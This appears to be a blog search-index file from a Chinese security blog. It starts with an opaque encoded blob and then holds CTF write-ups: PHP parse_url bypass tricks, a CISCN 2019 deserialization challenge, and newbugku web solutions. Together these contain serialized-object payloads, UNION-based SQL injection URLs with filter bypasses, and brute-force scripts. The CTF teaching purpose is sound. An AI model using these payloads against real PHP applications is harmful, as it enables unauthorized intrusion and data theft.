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]]></content>
  </entry>
  <entry>
    <title><![CDATA[parse_url-的一些tricks]]></title>
    <url>%2F2019%2F05%2F05%2Fparse-url-%E7%9A%84%E4%B8%80%E4%BA%9Btricks%2F</url>
    <content type="text"><![CDATA[无协议报错&lt;?php $url = $_GET[&apos;url&apos;]; $data = parse_url($url); var_dump($data); ?&gt; 该函数在URL没有协议的时候，加上端口会报错 不加端口会正常进行解析 其他情况下可以正常解析 当端口有字母时，依然会正常解析 端口错误解析url为 http://127.0.0.1/demo1.php?url=//yml-sec.top/index:80 我们期望的解析结果是这样的 而实际的解析结果是这样的 路径解析错误http://127.0.0.1/demo1.php?url=//yml-sec.top?/index/config.php 解析结果 http://127.0.0.1/demo1.php?url=/yml-sec.top?/index/config.php 解析结果 ///解析返回false如ciscn题目部分源码 &lt;?php $payload= $_GET[&apos;url&apos;]; if(isset($payload)){ $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); var_dump($url); parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload); }else{ echo &quot;Missing parameters&quot;; } ?&gt; 正常输入会拦截 使用///时会成功的绕过]]></content>
      <tags>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ciscn2019-justsoso涉及知识点总结]]></title>
    <url>%2F2019%2F05%2F05%2Fciscn2019-justsoso%E6%B6%89%E5%8F%8A%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[题目源码： index.php &lt;html&gt; &lt;?php error_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;]; if(!isset($file)){ echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;; } if(preg_match(&quot;/flag/&quot;,$file)){ die(&apos;hack attacked!!!&apos;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload); }else{ echo &quot;Missing parameters&quot;; } ?&gt; &lt;!--Please test index.php?file=xxx.php --&gt; &lt;!--Please get the source of hint.php--&gt; &lt;/html&gt; hint.php &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } ?&gt; 先来看hint.php的源代码，我们需要构造反序列化字符串读取到flag.php文件，handle类中调用了getflag方法，而flag类中同样存在getflag方法，在我博客曾写过这么一篇文章 我们可以通过构造反序列化字符换来调用Flag类中的getflag函数。 这里涉及到题目的几个注意的点： 我们需要绕过wakeup函数 我们还需要想办法对下面的校验进行处理 对于wakeup函数的绕过问题，可参考前面的反序列化文章，里面有详细的总结 源代码中要求token和token_flag值是相等的，对于token和token_flag的比较，这里要熟悉一下PHP中的指针，我们可以将token和token_flag绑定到一个地址上，这样无论我们赋予token什么值，token与token_flag总是相等的 所以payload我们可以这样写 &lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\n&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } } } $a = new Flag(&quot;flag.php&quot;); $b = new Handle($a); $a-&gt;token = &quot;yemoli&quot;; $a-&gt;token_flag=&amp;$a-&gt;token; echo serialize($b); ?&gt; 得到如下的payload O:6:&quot;Handle&quot;:1:{s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}} Handlehandle的长度为12，但是它却显示是14，这是因为成员变量是私有变量，查看源代码发现生成了两个方块一样的不可见字符 我们用%00填充即可，同时要注意绕过wakeup 最后的payload O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}} 然后我们转过来看index.php 需要思考的是这一部分 我们可以利用该函数多个/返回false的特性绕过 payload http://127.0.0.1///?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:6:&quot;yemoli&quot;;s:10:&quot;token_flag&quot;;R:4;}}]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[newbugku部分web题解]]></title>
    <url>%2F2019%2F04%2F26%2Fnewbugku%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[web1题目代码 看到extract函数，联想到常见的变量覆盖漏洞 根据我以前写的文章 点击链接 可以构造$b为任意值，后面判断了a和c是否相等，可以使用伪协议来做 web11打开题目显示如下 标题为robots,尝试访问robots.txt，访问后提示我们shell.php 访问shell.php 这块校验和西湖论剑的留言板题目很像，爆破脚本 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode(&apos;utf-8&apos;)) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == &apos;dc7dc4&apos;: print(i) break 结果如下 输入爆破出来的数字即可得到flag web13提交数据抓包，发现了base64加密的password 解密后是一个flag,但是提交发现并不正确，仔细观察数据包会发现一个hint Hint: Seeing is not believing, maybe you need to be faster! 尝试将假flag中的字符串当做密码提交 提示我们要快一些，这样写脚本就可以了 import requests import base64 import re url = &quot;http://123.206.31.85:10013/index.php&quot; s = requests.session() html = s.post(url,data={&quot;password&quot;:&quot;123456&quot;}) #print(html.text) password1 = html.headers[&apos;password&apos;] password2 = base64.b64decode(password1) re_str = re.compile(&apos;flag{(.*?)}&apos;,re.S) password = re.findall(re_str,str(password2)) print(password[0]) html = s.post(url,data={&quot;password&quot;:password[0]}) print(html.text) web18题目是一道sql注入，过滤了and or select union 这些可用双写绕过 判断列数 http://123.206.31.85:10018/list.php?id=2&apos; oorrder by 3--+ 在判断为4时页面无返回 所以我们得到列数为3 查询数据库名 http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,database(),3--+ 查询表名 http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&apos;web18&apos;--+ 查询列名 http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&apos;flag&apos;--+ 获取flag http://123.206.31.85:10018/list.php?id=-2&apos; uniounionn selecselectt 1,flag,3 from flag--+ web20题目如下 常规编写脚本即可，key=密文 import requests import re while(1): url = &quot;http://123.206.31.85:10020/&quot; s = requests.session() html = s.get(url) re1 = re.compile(&apos;¼(.*?)&lt;br/&gt;&apos;,re.S) result = re.findall(re1,html.text) url2 = url+&quot;?key=&quot;+result[0] html1 = s.get(url2) print(html1.text) 有一点要注意，这题目的flag是有几率出现的，需要多跑几次 web25web3定位到上传界面 观察链接联想到文件包含漏洞，可以使用伪协议读取 用扫描器扫描发现flag.php文件，开始利用伪协议读取 解密后得到flag web4题目是一个登录框，尝试使用万能密码登录 提交后竟然登录成功。。。。。 web15提示vim编辑器，想到临时文件swp 输入swp提交 将1改为i成功解出题目 web22web21访问题目查看源码 读取class.php的源码 &lt;?php error_reporting(E_ALL &amp; ~E_NOTICE); class Read{//f1a9.php public $file; public function __toString(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); } return &quot;__toString was called!&quot;; } } ?&gt; 提示我们有f1a9.php，这段代码可用反序列化利用 &lt;?php error_reporting(E_ALL &amp; ~E_NOTICE); class Read{//f1a9.php public $file = &quot;f1a9.php&quot;; public function __toString(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); } return &quot;__toString was called!&quot;; } } $a = new Read; echo serialize($a); ?&gt; 最后payload web23题目主页面如下 使用扫面器扫出如下页面 readme.txt有如下提示 用户名是admin 密码是三位数字，我们可以用burp爆破 成功登陆后得到flag web7注册登陆后，提示权限不够 尝试抓包 看到u和r的前几位是一样的，后面不一样的部分像是MD5加密后的字符串 在线解了一下 尝试把两个部分都换成admin的MD5加密字符串 得到FLAG web12题目如下 查看源码 class Time{ public $flag = ******************; public $truepassword = ******************; public $time; public $password ; public function __construct($tt, $pp) { $this-&gt;time = $tt; $this-&gt;password = $pp; } function __destruct(){ if(!empty($this-&gt;password)) { if(strcmp($this-&gt;password,$this-&gt;truepassword)==0){ echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;; if(!empty($this-&gt;time)){ if(!is_numeric($this-&gt;time)){ echo &apos;Sorry.&lt;br&gt;&apos;; show_source(__FILE__); } else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66){ echo &apos;you need a bigger time.&lt;br&gt;&apos;; } else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11){ echo &apos;you need a smaller time.&lt;br&gt;&apos;; } else{ sleep((int)$this-&gt;time); var_dump($this-&gt;flag); } echo &apos;&lt;hr&gt;&apos;; } else{ echo &apos;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&apos;; } } else{ echo &apos;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&apos;; } } else{ echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;; } } function __wakeup(){ $this-&gt;password = 1; echo &apos;hello hacker,I have changed your password and time, rua!&apos;; } } if(isset($_GET[&apos;rua&apos;])){ $rua = $_GET[&apos;rua&apos;]; @unserialize($rua); } else{ echo &quot;&lt;h1&gt;Please don&apos;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;; } 常规的反序列化操作，计算符合条件的时间 exp &lt;?php class Time{ public $time; public $password; public function __construct($tt, $pp) { $this-&gt;time = $tt; $this-&gt;password = $pp; } } $password = array(0=&gt;&apos;yml&apos;); $time = &apos;0x4c06f351&apos;; $yml = new Time($time,$password); echo serialize($yml); ?&gt; payload 绕过wakeup O:4:&quot;Time&quot;:3:{s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:{i:0;s:3:&quot;yml&quot;;}} 得到flag web24]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Z3简介及在逆向领域的应用]]></title>
    <url>%2F2019%2F04%2F14%2FZ3%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%9C%A8%E9%80%86%E5%90%91%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
